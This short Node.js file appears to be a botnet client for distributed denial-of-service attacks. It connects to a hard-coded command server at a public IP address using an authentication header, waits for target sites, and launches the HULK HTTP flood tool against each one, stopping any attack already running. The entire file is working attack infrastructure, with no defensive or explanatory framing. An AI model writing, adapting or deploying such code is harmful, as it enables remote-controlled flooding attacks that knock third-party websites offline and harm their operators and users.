const io = require("socket.io-client");
const cp = require('child_process');
const path = require('path')

var END_POINT = 'http://121.41.36.2:3000/client'
var GO_PATH = '/usr/local/go/bin/go';

var HULK_SRC_PATH = path.join(__dirname, "/src/hulk/hulk.go");
global.HULK_PID = undefined;

const socket = io(END_POINT, {
  reconnectionDelayMax: 10000,
  transportOptions: {
    polling: {
      extraHeaders: {
        'auth': '40d5f910719ff4cc7352c4d09bfd4803'
      }
    }
  }
});

socket.on("connect", () => {
    console.log("Connected to the server");
    socket.on('target', (target) => {
        startAttack(target);
    })
});

function startAttack(target) {
    //Killing ongoing attack.
    if(!HULK_PID == '') {
        process.kill(HULK_PID);
    }
    //Starting the new attack.
    if(!target == '') {
        let hulk_proc = cp.execFile(GO_PATH, ["run", HULK_SRC_PATH, '-site', target]);
        HULK_PID = hulk_proc.pid;
        console.log('Starting PID -> ', HULK_PID);
        hulk_proc.on('exit', () => {
          console.log('Stopping PID -> ', HULK_PID);
          HULK_PID = '';
        });

    }
}